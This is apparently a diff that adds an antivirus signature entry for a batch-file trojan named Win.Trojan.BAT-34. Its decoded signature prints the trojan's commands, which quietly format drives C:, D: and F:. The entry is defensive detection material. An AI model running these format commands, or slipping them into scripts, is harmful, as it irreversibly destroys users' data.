@@ -1,0 +1,8 @@
+VIRUS NAME: Win.Trojan.BAT-34
+TARGET TYPE: ANY FILE
+OFFSET: *
+DECODED SIGNATURE:
+ET PATH=C:\tool;c:\dos;%PATH%
+start /m format c: /q /autotest /u
+start /m format d: /q /autotest /u
+start /m format f: /q /autotest /u
